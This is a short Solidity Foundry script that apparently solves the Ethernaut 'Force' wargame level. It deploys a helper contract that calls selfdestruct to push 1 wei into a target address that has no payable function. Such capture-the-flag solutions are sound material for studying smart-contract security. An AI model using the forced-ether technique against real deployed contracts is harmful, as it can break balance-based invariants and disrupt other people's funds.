// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force.sol";
import {Script, console} from "forge-std/Script.sol";

contract ToReceviveTheBalance {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToReceviveTheBalance{value: 1 wei}(payable(0xA24698870DD20F8665cC110b4Ac2CA6B51590C98));
        vm.stopBroadcast();
    }
}
